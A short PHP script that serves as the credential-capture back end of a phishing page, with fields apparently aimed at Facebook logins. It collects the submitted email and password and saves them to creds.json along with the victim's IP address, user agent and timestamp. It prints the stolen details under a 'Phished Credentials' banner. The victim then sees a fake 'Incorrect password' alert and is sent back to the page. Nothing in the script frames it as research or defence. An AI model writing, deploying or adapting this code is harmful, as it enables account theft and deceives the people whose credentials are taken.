<?php
session_start();

// Retrieve email and password (priority: SESSION > POST)
$email = isset($_SESSION["Email"]) ? $_SESSION["Email"] : ($_POST['email'] ?? $_POST['fb_email'] ?? '');
$pass  = $_POST['password'] ?? $_POST['pass'] ?? $_POST['fb_pass'] ?? '';
$type  = $_POST['type'] ?? 'Unknown';

// URL encode the credentials
$email = urlencode($email);
$pass  = urlencode($pass);
$type  = urlencode($type);

// Get client IP address
function getClientIP() {
    $ipKeys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    foreach ($ipKeys as $key) {
        if (!empty($_SERVER[$key])) {
            $ipList = explode(',', $_SERVER[$key]);
            return trim($ipList[0]);
        }
    }
    return 'UNKNOWN';
}

$ip = getClientIP();
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
$timestamp = date('Y-m-d H:i:s');

// Prepare data for JSON log
$data = [
    'email' => $email,
    'password' => $pass,
    'type' => $type,
    'ip' => $ip,
    'user_agent' => $userAgent,
    'timestamp' => $timestamp
];

// Save to creds.json
$file = 'creds.json';
$entries = [];

if (file_exists($file)) {
    $json = file_get_contents($file);
    $entries = json_decode($json, true);
    if (!is_array($entries)) $entries = [];
}
$entries[] = $data;
file_put_contents($file, json_encode($entries, JSON_PRETTY_PRINT));

// Terminal color codes (CLI only)
$green = "\033[1;32m";
$red = "\033[1;31m";
$reset = "\033[0m";

// Output the table with colored fields (CLI only)
$line = "+---------------------+-------------------------------+\n";
$table = "\n" .
    $line .
    "|               🎯 Phished Credentials                |\n" .
    $line .
    "| Email              | " . $green . str_pad(urldecode($email), 30) . $reset . "|\n" .
    "| Password           | " . $red   . str_pad(urldecode($pass), 30)  . $reset . "|\n" .
    "| Type               | " . str_pad(urldecode($type), 30) . "|\n" .
    "| IP Address         | " . str_pad($ip, 30) . "|\n" .
    "| User-Agent         | " . str_pad(substr($userAgent, 0, 30), 30) . "|\n" .
    "| Timestamp          | " . str_pad($timestamp, 30) . "|\n" .
    $line;

// Detect execution context
if (php_sapi_name() === 'cli') {
    echo $table;
} else {
    error_log(strip_tags($table)); // logs to server logs
    echo "<script>
        alert('❌ Incorrect password. Please try again.');
        window.history.back();
    </script>";
}
exit;
?>
